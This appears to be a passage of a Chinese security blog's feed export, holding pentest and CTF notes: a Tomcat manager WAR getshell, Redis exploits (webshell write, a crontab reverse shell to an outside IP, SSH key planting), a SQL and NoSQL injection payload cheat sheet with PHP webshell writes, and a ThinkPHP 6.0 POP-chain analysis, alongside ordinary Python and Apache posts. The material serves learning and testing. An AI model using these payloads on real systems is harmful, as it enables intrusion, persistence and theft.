username=&quot;both&quot; password=&quot;admin&quot; roles=&quot;tomcat,role1&quot;/&gt;&lt;user username=&quot;role1&quot; password=&quot;admin&quot; roles=&quot;role1&quot;/&gt;</code></pre><p>之后访问到 <code>http://127.0.0.1:8080/manager</code></p><p>写一个shell.jsp，打包之后改名为war包上传即可getshell(也可以用msf生成一个war包)</p><h3 id="tomcat目录遍历"><a href="#tomcat目录遍历" class="headerlink" title="tomcat目录遍历"></a>tomcat目录遍历</h3><p><code>web.xml</code> 中如果 <code>listings</code> 参数为true，导致目录遍历漏洞</p><p><img src="/posts/6941c9ee/1584495111390.png" alt> </p><h2 id="redis常见漏洞"><a href="#redis常见漏洞" class="headerlink" title="redis常见漏洞"></a>redis常见漏洞</h2><p>给你一个未授权访问redis，你能做啥？</p><h3 id="redis写shell"><a href="#redis写shell" class="headerlink" title="redis写shell"></a>redis写shell</h3><pre><code>config set dir /var/www/htmlconfig set dbfilename redis.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save</code></pre><h3 id="写crontab反弹shell"><a href="#写crontab反弹shell" class="headerlink" title="写crontab反弹shell"></a>写crontab反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p><pre><code>root@kali:~# redis-cli -h 192.168.63.130192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;OK192.168.63.130:6379&gt; config set dir /var/spool/cron/OK192.168.63.130:6379&gt; config set dbfilename rootOK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="写ssh-keygen公钥"><a href="#写ssh-keygen公钥" class="headerlink" title="写ssh-keygen公钥"></a>写ssh-keygen公钥</h3><p>在以下条件下，可以利用此方法</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p><code>ssh-keygen -t rsa</code> 生成一对公私钥</p><p>然后redis执行命令，注意写入的公钥必须要前后分别加个换行</p><pre><code>192.168.63.130:6379&gt; config set dir /root/.ssh/OK192.168.63.130:6379&gt; config set dbfilename authorized_keysOK192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;OK192.168.63.130:6379&gt; saveOK</code></pre><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h2 id="phpmyadmin常见漏洞"><a href="#phpmyadmin常见漏洞" class="headerlink" title="phpmyadmin常见漏洞"></a>phpmyadmin常见漏洞</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/256#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/256#toc-2</a></p><p><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf常用命令&quot;&gt;&lt;a href=&quot;#msf常用命令&quot; class=&quot;headerlink&quot; title=&quot;msf常用命令&quot;&gt;&lt;/a&gt;msf常用命令&lt;/h2&gt;&lt;h3 id=&quot;msfvenom&quot;&gt;&lt;a href=&quot;#msfvenom&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="http://prontosil.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Laravel POP链讲解</title>
    <link href="http://prontosil.com/posts/898eeda9/"/>
    <id>http://prontosil.com/posts/898eeda9/</id>
    <published>2020-03-18T00:27:16.000Z</published>
    <updated>2020-03-18T00:45:48.519Z</updated>
    
    <content type="html"><![CDATA[<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=90514239&cid=154578272&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="480" width="780"> </iframe></div>]]></content>
    
    <summary type="html">
    
      
      
        

&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;
&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=90514239
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="POP" scheme="http://prontosil.com/tags/POP/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="http://prontosil.com/posts/9b13a55/"/>
    <id>http://prontosil.com/posts/9b13a55/</id>
    <published>2020-03-17T14:35:41.000Z</published>
    <updated>2020-04-03T14:20:41.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用的绕过手段"><a href="#常用的绕过手段" class="headerlink" title="常用的绕过手段"></a>常用的绕过手段</h2><h3 id="字符型过滤单引号"><a href="#字符型过滤单引号" class="headerlink" title="字符型过滤单引号"></a>字符型过滤单引号</h3><ul><li>字符串转换函数绕过</li></ul><pre><code>char()</code></pre><ul><li>十六进制数绕过</li></ul><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><p>between, like, &lt;, &gt;，regexp 绕过</p><pre><code>1 union select 1, table_name from information_schema.tables where table_name = &#39;users&#39;select 1, table_name from information_schema.tables where table_name between &#39;u&#39; and &#39;v&#39;;select 1, table_name from information_schema.tables where table_name like &#39;u%&#39;;</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p><pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><p>使用join(连接表的查询结果)</p><pre><code class="sql">union select 1,2     #等价于union select * from (select 1)a join (select 2)bmysql&gt; SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+| 1 | 2 | 3 | 4 | 5 |+---+---+---+---+---+1 row in set (0.00 sec)</code></pre><p>使用like</p><pre><code class="sql">select ascii(mid(user(),1,1))=80   #等价于select user() like &#39;r%&#39;mysql&gt; select user() like &#39;r%&#39;;+------------------+| user() like &#39;r%&#39; |+------------------+|                1 |+------------------+1 row in set (0.00 sec)</code></pre><p>对于 <code>limit</code> 可以使用 offset绕过</p><pre><code class="sql">select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0</code></pre><h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul><li>greatest函数绕过</li></ul><blockquote><p>greatest(a,b)，返回a和b中较大的那个数</p></blockquote><pre><code># 猜解user()第一个字符的ascii码是否小于等于150时ascii(mid(user(),1,1)) &lt;= 150=greatest(ascii(mid(user(),1,1)), 150)=150;</code></pre><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul><li>\</li></ul><pre><code># 用户名为usernameSQL&gt; select * from db where name=&#39;username\&#39; and passwd=&#39; or 1=1#</code></pre><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23-- 后面要加空格/**/ 只加前半个也行;%00 Nullbyte` Backtick</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p><pre><code>|| ascii(mid(user(),1,1) ) = 97 %23</code></pre><h3 id="绕过-information-被过滤"><a href="#绕过-information-被过滤" class="headerlink" title="绕过 information 被过滤"></a>绕过 information 被过滤</h3><ol><li>MySQL 5.7之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息 。<br>如果waf掉了<code>information</code>我们可以利用这两个表注入数据库名和表名。</li><li>参考 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li></ol><p>MySQl5.7的新特性</p><ul><li>sys.schema_auto_increment_columns  该视图的作用简单来说就是用来对表自增ID的监控。</li><li>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer</li></ul><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p><pre><code>mysql&gt; select * from user;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |+----+----------+----------------------------------+1 row in set (0.00 sec)</code></pre><p>测试</p><pre><code>mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);Empty set (2.00 sec)mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);Empty set (0.00 sec)</code></pre><p>我们这么来理解多语句的and</p><p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p><p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>order by 后的数字可以作为一个注入点</p><p>报错注入</p><pre><code>mysql&gt; select * from flag order by 1 and (updatexml(1,concat(0x7e,(select user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;</code></pre><p>时间盲注</p><pre><code>select * from flag order by 1 and if(1=1,sleep(3), NULL);</code></pre><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</p><p>报错注入</p><pre><code>mysql&gt; select * from users where id&gt;1 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.53&#39;</code></pre><p>时间注入</p><pre><code>select * from users where id&gt;1 order by id limit 1,1 procedure analyse((select extractvalue (rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);</code></pre><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><a href="https://buuoj.cn/challenges#[SWPU2019]Web1" target="_blank" rel="noopener">例题链接</a></p><blockquote><p>过滤了空格和or，并且没办法绕过过滤or</p><p>同时不知道列名</p><p>payload: <code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></p></blockquote><p>这样在不知道列名的情况下，就可以给每一列取一个别名了</p><pre><code>mysql&gt; select 1,2,3 union select * from user;+---+-------+--------+| 1 | 2     | 3      |+---+-------+--------+| 1 | 2     | 3      || 1 | admin | mysql  || 2 | hhh   | 123    || 3 | aaaaa | cccccc |+---+-------+--------+4 rows in set (0.00 sec)</code></pre><p>查询</p><pre><code>mysql&gt; select group_concat(b) from (select 1,2,3 as b union select * from user)a;+--------------------+| group_concat(b)    |+--------------------+| 3,mysql,123,cccccc |+--------------------+1 row in set (0.00 sec)</code></pre><p>查询两列数据</p><pre><code>select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a;</code></pre><p>查询一行数据</p><pre><code>select `2` from (select 1,2,3 union select * from users)a limit 1,1;</code></pre><p><a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">无列名注入参考</a></p><p><strong>使用join进行无列名注入</strong></p><p>这样就能依次把列名都爆出来了</p><pre><code>mysql&gt; select * from user;+---------+-----------+-----------+| user_id | user_name | user_pass |+---------+-----------+-----------+|       1 | admin     | mysql     ||       2 | hhh       | 123       ||       3 | aaaaa     | cccccc    |+---------+-----------+-----------+3 rows in set (0.00 sec)mysql&gt; select*from (select * from user as a join user b)c;ERROR 1060 (42S21): Duplicate column name &#39;user_id&#39;mysql&gt; select*from (select * from user as a join user b using(user_id))c;ERROR 1060 (42S21): Duplicate column name &#39;user_name&#39;</code></pre><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p>以mongodb为例</p><pre><code>db.collection.find(query, projection)//query 可选，使用查询操作符指定查询条件//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）举例：//查找username为JrXnm的信息db.user.find({&#39;username&#39;:&#39;JrXnm&#39;}) </code></pre><p>第一种是按照语言的分类：php数组注入、js注入、mongo shell拼接注入。</p><p>第二种是按照攻击机制分类：永真式、联合查询、Js注入、盲注等。</p><p>PHP永真式注入</p><pre><code>$data = array(    &#39;username&#39; =&gt;  $_REQUEST[&#39;username&#39;],    &#39;password&#39; =&gt;  $_REQUEST[&#39;password&#39;]); $cursor = $collection-&gt;find($data);</code></pre><p>但是由于php松散结构的特性，如果我们_GET传入的是数组那么，会自动被解析成字典。比如我们输入<code>?username[$ne]=1&amp;password[$ne]=1</code>， 就会被解析成：</p><pre><code>{    &#39;username&#39;: {        &#39;$ne&#39;: &#39;1&#39;    },    &#39;password&#39;: {        &#39;$ne&#39;: &#39;1&#39;    }}</code></pre><p>这样就能查询到所有用户信息</p><p>Js注入</p><pre><code>$collection = $db-&gt;users;$query_body =&quot;        function q() {            var username = &#39;&quot;.$_REQUEST[&quot;username&quot;].&quot;&#39;;            var password = &#39;&quot;.$_REQUEST[&quot;password&quot;].&quot;&#39;;if(username == &#39;secret_user&#39;&amp;&amp;password == &#39;secret_password&#39;) return true; else{ return false;}}&quot;; $result = $collection-&gt;find(array(&#39;$where&#39;=&gt;$query_body));$count = $result-&gt;count();if($count&gt;0){    echo $doc_succeed-&gt;saveHTML();}</code></pre><p><code>$where</code>操作符表示执行其中的Js内容，返回True的话返回所有内容。</p><p>我们可以看到我们可以注入使得Js代码提前返回True</p><p>payload：<code>?username=qwer&amp;password= 1&#39;;return true;var qwer=&#39;1</code></p><h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;开启日志监测，一般是关闭的，如果一直开，文件会很大的。set global general_log_file = ‘G:/2.txt’;这里设置我们需要写入的路径就可以了。select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;查询一个一句话，这个时候log日志里就会记录这个。set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;结束后，再修改为原来的路径。set global general_log = off;关闭下日志记录。</code></pre><h4 id="延时注入写shell"><a href="#延时注入写shell" class="headerlink" title="延时注入写shell"></a>延时注入写shell</h4><pre><code>select sleep(2),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;d:\\success.txt&#39;;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常用的绕过手段&quot;&gt;&lt;a href=&quot;#常用的绕过手段&quot; class=&quot;headerlink&quot; title=&quot;常用的绕过手段&quot;&gt;&lt;/a&gt;常用的绕过手段&lt;/h2&gt;&lt;h3 id=&quot;字符型过滤单引号&quot;&gt;&lt;a href=&quot;#字符型过滤单引号&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="http://prontosil.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python数据结构</title>
    <link href="http://prontosil.com/posts/7f8e2ad4/"/>
    <id>http://prontosil.com/posts/7f8e2ad4/</id>
    <published>2020-03-17T13:29:33.000Z</published>
    <updated>2020-03-17T14:14:47.958Z</updated>
    
    <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;补充一个小知识&lt;/p&gt;
&lt;p&gt;python 输入重定向为文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import sys

sys.stdin = open(&amp;quot;test.txt&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后就可以直接从文件读入，不需要手动输入了&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://prontosil.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp6.0漏洞分析</title>
    <link href="http://prontosil.com/posts/314a66d3/"/>
    <id>http://prontosil.com/posts/314a66d3/</id>
    <published>2020-03-17T12:33:18.000Z</published>
    <updated>2020-03-17T14:14:47.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;通过session写文件&quot;&gt;&lt;a href=&quot;#通过session写文件&quot; class=&quot;headerlink&quot; title=&quot;通过session写文件&quot;&gt;&lt;/a&gt;通过session写文件&lt;/h2&gt;&lt;p&gt;漏洞点位于：&lt;code&gt;/think/session/Sto
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="thinkphp" scheme="http://prontosil.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>apache配置文件简单记录</title>
    <link href="http://prontosil.com/posts/a3f2ee6b/"/>
    <id>http://prontosil.com/posts/a3f2ee6b/</id>
    <published>2020-03-14T13:23:42.000Z</published>
    <updated>2020-03-15T11:42:38.520Z</updated>
    
    <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
    
    <summary type="html">
    
      
      
